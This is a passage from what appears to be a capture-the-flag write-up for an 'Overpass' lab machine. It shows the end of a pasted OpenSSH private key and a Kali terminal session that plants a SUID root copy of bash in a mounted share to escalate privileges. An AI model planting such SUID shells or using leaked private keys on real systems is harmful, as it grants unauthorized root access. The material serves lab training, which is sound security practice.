iooTuTr6wyjcXjvBl0yTKFCAcgqx0PyupZSmx0xL2VFgBKoRA7VZXmMtADAf6PyAdrSrwX
kjKyFT8YPkgJr5S1vAuI9++WKlMF+tIm/PIYOYKnQHWxSUQiCj8MxBhcFbnF1uIuuIB9iF
8Oy3PEM58Pl9wyLa5L7K8j2l8/u9KNAAAAwQDu2C2f+RLMnjSSI/Mu8axi3YUmN0fdCkUo
V5u9QuAbMlmUHTjtR9P09qxhjQvxCDd6RogyLtYg0raNDIC721Lf8k7JVOHPzzIz/QKEHN
FqUSrNm5xNzat8V69ccaopYXl9+WBo3CffvNiDuGyUX4X39IKB4DfX5iI+0aZ7y3X49Z4T
bPexCHMxlw+e/CUqUHgK4uV8nRkA/mg/2VUA8hSaRDZlX8vTYeZt1uvpvOU0VEqkHis1Uv
pF0lxEGYhnA3cAAAAbamFtZXNAbG9jYWxob3N0LmxvY2FsZG9tYWlu
-----END OPENSSH PRIVATE KEY-----
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/james/.ssh]
└─# nano ../../id_rsa         
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/james/.ssh]
└─# cd ..  
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/james]
└─# cp /bin/bash ./bashroot; chmod +s ./bashroot
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/james]
└─# ls -l 
total 1208
-rwsr-sr-x 1 root root 1230360 Jul 28 18:54 bashroot
-rw------- 1 kali kali      38 Nov 17  2020 user.flag
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads/james]
└─# cd ..
                                                                                     
┌──(root㉿kali)-[/home/kali/Downloads]
└─# umount ./james


```

[[Overpass]]